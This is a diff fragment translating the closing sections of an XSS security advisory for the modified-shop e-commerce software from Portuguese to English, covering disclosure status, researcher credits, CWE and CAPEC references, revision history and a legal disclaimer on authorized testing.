+| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
+| **Contact Channel** | GitHub Security Advisories / Issues |
+| **Status** | Notification sent on 2026-11-12. Awaiting response. |
+| **SLA** | 90 days for coordinated publication (CVD Best Practices) |
 
 ---
 
-## 15\. Créditos
+## 15\. Credits
 
-| Campo | Detalhe |
+| Field | Detail |
 | :---- | :---- |
-| **Pesquisador** | Carlos Augusto Adriano Filho |
-| **Cargo** | Analista Red Team Sênior |
-| **Área** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
-| **Metodologias** | OWASP Testing Guide · PTES · NIST SP 800-115 |
+| **Researcher** | Carlos Augusto Adriano Filho |
+| **Role** | Senior Red Team Analyst |
+| **Focus Areas** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
+| **Methodologies** | OWASP Testing Guide · PTES · NIST SP 800-115 |
 
 ---
 
-## 16\. Referências
+## 16\. References
 
 - [CWE-79 — Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)  
 - [CAPEC-86 — XSS via HTTP Query Strings](https://capec.mitre.org/data/definitions/86.html)  
@@ -533,21 +533,21 @@ em referer de /admin/paypal_webhook.php
 
 ---
 
-## 17\. Histórico de Revisões
+## 17\. Revision History
 
-| Versão | Data | Autor | Descrição |
+| Version | Date | Author | Description |
 | :---- | :---- | :---- | :---- |
-| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Publicação inicial |
+| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Initial publication |
 
 ---
 
-## 18\. Aviso Legal
+## 18\. Legal Disclaimer
 
-> **AVISO LEGAL:** Este advisory foi elaborado exclusivamente para fins educacionais e de segurança, em ambiente de laboratório controlado, com autorização explícita. As técnicas e ferramentas descritas são destinadas a profissionais de segurança da informação para fins de teste de penetração autorizado e pesquisa de vulnerabilidades.  
+> **LEGAL DISCLAIMER:** This advisory was prepared exclusively for educational and security purposes, in a controlled laboratory environment, with explicit authorization. The techniques and tools described are intended for security professionals for authorized penetration testing and vulnerability research purposes only.  
 >   
-> O uso das informações, técnicas ou ferramentas aqui descritas em sistemas **sem autorização expressa é ilegal e antiético**, podendo resultar em responsabilidade criminal e civil.  
-> Este documento segue os princípios de **Responsible Disclosure** e foi elaborado em conformidade com a **Lei nº 12.737/2012** (Lei Carolina Dieckmann), **LGPD (Lei nº 13.709/2018)** e as diretrizes éticas do EC-Council, OWASP e ISO/IEC 29147:2018.
+> The use of the information, techniques, or tools described herein on systems **without explicit authorization is illegal and unethical**, and may result in criminal and civil liability.   
+> This document follows the principles of **Responsible Disclosure** and was prepared in compliance with **Brazilian Law nº 12.737/2012** (Computer Crimes Act), **LGPD (Law nº 13.709/2018)** (Brazilian Data Protection Law), and the ethical guidelines of EC-Council, OWASP, and ISO/IEC 29147:2018.
 
 ---
 
-*© 2026 Carlos Augusto Adriano Filho* 
+*© 2026 Carlos Augusto Adriano Filho*
